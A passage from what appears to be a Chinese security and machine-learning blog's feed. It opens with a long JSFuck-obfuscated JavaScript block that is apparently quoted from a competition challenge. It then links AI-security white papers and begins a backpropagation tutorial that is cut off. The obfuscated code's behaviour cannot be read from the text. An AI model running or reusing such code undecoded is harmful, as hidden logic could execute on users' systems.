!+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([![]] + [][[]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + ( + ![] + [![]] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[!+[] + !+[] + [ + []]]](!+[] + !+[] + [ + !+[]])[ + !+[]]] &amp;&amp; _______( - ___)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(__ = &gt;_[(![] + <span class="string">''</span>)[ + !+[]]][(![] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]][([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]](( !! [] + [])[ + !+[]] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ([][[]] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + !+[]] + (![] + [ + ![]])[([![]] + [][[]])[ + !+[] + [ + []]] + ( !! [] + [])[ + []] + (![] + [])[ + !+[]] + (![] + [])[!+[] + !+[]] + ([![]] + [][[]])[ + !+[] + [ + []]] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]]]()[ + !+[] + [ + []]] + [ + []] + (![] + [ + ![]])[([![]] + [][[]])[ + !+[] + [ + []]] + ( !! [] + [])[ + []] + (![] + [])[ + !+[]] + (![] + [])[!+[] + !+[]] + ([![]] + [][[]])[ + !+[] + [ + []]] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]]]()[ + !+[] + [ + []]])()[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]] + [])[ + !+[] + [!+[] + !+[]]] + (![] + [])[ + !+[]] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( + ( + !+[] + [ + []] + [ + !+[]]))[( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( + ![] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([![]] + [][[]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + ( + ![] + [![]] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[!+[] + !+[] + [ + []]]](!+[] + !+[] + [ + !+[]])[ + !+[]]](___ = &gt;$[(![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( + [![]] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]][([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]](( !! [] + [])[ + !+[]] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ([][[]] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + !+[]] + ( + [![]] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + !+[]]] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]][([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]](( !! [] + [])[ + !+[]] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ([][[]] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + !+[]] + ( + [![]] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + !+[]]] + ( !! [] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [])[ + !+[]] + ( + (!+[] + !+[] + [ + !+[]] + [ + !+[]]))[( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( + ![] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([![]] + [][[]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + ( + ![] + [![]] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[!+[] + !+[] + [ + []]]](!+[] + !+[] + !+[] + [ + !+[]])[ + !+[]] + ( !! [] + [])[!+[] + !+[] + !+[]])()(([] + [])[(![] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + ( !! [] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]]()[ + !+[] + [ + !+[]]])[!+[] + !+[]] + (![] + [])[ + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]])()())[!+[] + !+[] + !+[] + [ + []]] + ([![]] + [][[]])[ + !+[] + [ + []]] + (( + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]] + [])[ + !+[] + [ + !+[]]] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + []] + ( !! [] + [])[ + []]](____ = &gt;______(___, _____, __), ___)))</span><br><span class="line">&#125;)(<span class="built_in">window</span>, _, +[], +[], +[])</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;比较有意思的比赛，简单过了两关&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Sec" scheme="http://www.dyngq.top/categories/Sec/"/>
    
    
      <category term="Sec" scheme="http://www.dyngq.top/tags/Sec/"/>
    
  </entry>
  
  <entry>
    <title>人工智能赋能安全应用案例集(相关资料分享)</title>
    <link href="http://www.dyngq.top/2021/03/04/20210304-%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E8%B5%8B%E8%83%BD%E5%AE%89%E5%85%A8%E5%BA%94%E7%94%A8%E6%A1%88%E4%BE%8B%E9%9B%86(%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E5%88%86%E4%BA%AB)/"/>
    <id>http://www.dyngq.top/2021/03/04/20210304-人工智能赋能安全应用案例集(相关资料分享)/</id>
    <published>2021-03-03T16:00:01.000Z</published>
    <updated>2022-06-20T11:44:21.560Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>分享一些最近看到的相关资料</p></blockquote><a id="more"></a><ol><li>人工智能赋能安全应用案例集.pdf <a href="https://github.com/dyngq/dyngq/blob/master/pdf/人工智能赋能安全应用案例集.pdf" target="_blank" rel="noopener">下载</a></li><li>人工智能安全白皮书2020.pdf <a href="https://github.com/dyngq/dyngq/blob/master/pdf/人工智能安全白皮书2020.pdf" target="_blank" rel="noopener">下载</a></li><li>AI安全白皮书-华为-ai-security-white-paper-cn.pdf <a href="https://github.com/dyngq/dyngq/blob/master/pdf/AI安全白皮书-华为-ai-security-white-paper-cn.pdf" target="_blank" rel="noopener">下载</a></li><li>404师傅经典项目：<a href="https://github.com/404notf0und/AI-for-Security-Learning" target="_blank" rel="noopener">https://github.com/404notf0und/AI-for-Security-Learning</a></li></ol><h2 id="人工智能赋能安全应用案例集"><a href="#人工智能赋能安全应用案例集" class="headerlink" title="人工智能赋能安全应用案例集"></a>人工智能赋能安全应用案例集</h2>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;分享一些最近看到的相关资料&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Sec" scheme="http://www.dyngq.top/categories/Sec/"/>
    
    
      <category term="AI" scheme="http://www.dyngq.top/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>手撕BackPropagation (BP_Neural_Network)</title>
    <link href="http://www.dyngq.top/2020/12/12/20201212-%E6%89%8B%E6%92%95BackPropagation-BP-Neural-Network/"/>
    <id>http://www.dyngq.top/2020/12/12/20201212-手撕BackPropagation-BP-Neural-Network/</id>
    <published>2020-12-12T13:42:44.000Z</published>
    <updated>2022-06-20T11:44:21.560Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>深度学习基础；反向传播；</p></blockquote><p>手撕一下推导过程。</p><a id="more"></a><h2 id="0x00-BP神经网络结构"><a href="#0x00-BP神经网络结构" class="headerlink" title="0x00 BP神经网络结构"></a>0x00 BP神经网络结构</h2><ul><li>输入层，隐藏层（神经元）*，输出层。</li><li>一种简单的示例结构:<img src="https://img.dyngq.top/images/20201121214251.png" alt="image-20201121211828223" style="zoom:80%;"></li><li>其实理解神经网络的计算过程，计算图是最合适的。<a href="#ref">参考[2]</a><img src="https://img.dyngq.top/images/20201121214254.jpg" alt="img" style="zoom: 67%;"></li></ul><h2 id="0x01-梯度-amp-链式法则"><a href="#0x01-梯度-amp-链式法则" class="headerlink" title="0x01 梯度&amp;链式法则"></a>0x01 梯度&amp;链式法则</h2><h3 id="梯度"><a href="#梯度" class="headerlink" title="梯度"></a>梯度</h3><ul><li><p>神经网络常常采用随机梯度下降的方法，来使得损失降低，参数逼近最优解。</p></li><li><p>所以，梯度是什么？</p><ul><li><p><strong>损失函数对参数的导数</strong></p></li><li><script type="math/tex; mode=display">{\frac{∂C_{}}{∂w_{1}}}、{\frac{∂C_{}}{∂b_{1}}}、{\frac{∂C_{}}{∂w_{2}}}、{\frac{∂C_{}}{∂b_{2}}}、...</script></li></ul></li><li><p>参数的<strong>梯度</strong>乘以<strong>学习率</strong>就是该参数所需要更新(+/-)的值。</p></li><li><p><img src="https://img.dyngq.top/images/20201121214258.png" alt="image-20201121205535658" style="zoom:50%;"></p></li></ul><h3 id="链式法则"><a href="#链式法则" class="headerlink" title="链式法则"></a>链式法则</h3><ul><li>微积分的重要定理，示例如下</li><li><img src="https://img.dyngq.top/images/20201121214306.png" alt="image-20201121205727689" style="zoom: 50%;"></li></ul><h2 id="0x02-整体流程"><a href="#0x02-整体流程" class="headerlink" title="0x02 整体流程"></a>0x02 整体流程</h2><ol><li><p><strong>正向传播</strong>，根据input计算出output，与此同时呢，会计算和记录当前的<strong>中间变量</strong>，以便反向传播时不必重复计算。</p></li><li><p>根据损失函数计算误差，记为 <strong>C</strong> (cost)。</p></li><li><p><strong>反向传播</strong>，反向计算并记录，以便更新每一层的权重，</p><script type="math/tex; mode=display">θ = \{w_1,b_1,w_2,b_2,...,w_{n-1},b_{n-1},w_{n},b_{n}\}</script><script type="math/tex; mode=display">w^1 = w^0-lr*{\frac{∂C_{}}{∂w_{1}}}</script></li></ol><script type="math/tex; mode=display">b^1 = b^0-lr*{\frac{∂C_{}}{∂b_{0}}}</script><p>其中，lr是自定义的学习率。所以问题就是求参数对损失函数的微分，这一步就需要使用求微分的链式法则。</p><p>如图一所示，我们要求w1对C的偏导，就需要根据路径，根据计算图，链式的去求解。</p><script type="math/tex; mode=display">{\frac{∂C_{}}{∂w_{1}}} = {\frac{∂C_{}}{∂w_{1}}}</script><p>但其实这更容易被理解成正向传播，所以我个人喜欢这么表示（具体原因下一部分会讲）:</p><script type="math/tex; mode=display">{\frac{∂C_{}}{∂w_{1}}} = {\frac{∂C_{}}{∂w_{1}}}</script><ul><li>现代神经网络一般分为两步，求梯度，梯度更新。(参考[3])</li><li>以pytorch举例</li><li><ol><li>loss.backward() 反向传播 <ol><li>backward()会根据tensor的requires_grad属性（true\false）计算梯度。</li><li>其他需要的数据在forward时已经存储。</li></ol></li><li>optimizer.step() 优化器更新参数。</li></ol></li><li>以下部分将进行详细说明</li></ul><h3 id="正向传播"><a href="#正向传播" class="headerlink" title="正向传播"></a>正向传播</h3><p>首先，我们需要知道，直接正向传播来求，可不可以</p><ol><li>在某种意义上是可以的，只要运算完成，根据存储的大量中间量以及最终结果，运用链式法则肯定是可以算的，那为什么还需要反向传播呢。</li><li>首先来看正向传播怎么算，这里把网络加一层<img src="https://img.dyngq.top/images/20201121214310.png" alt="image-20201121212847456" style="zoom:50%;"></li><li></li><li>下边两个图都展示了，正向传播直接计算的话，中间变量重复性极大，每次都要计算的这些重复算式的话，计算量冗余太大，这就是正向传播，类似于正向搜索的弊端。</li><li><img src="https://img.dyngq.top/images/20201121214312.png" 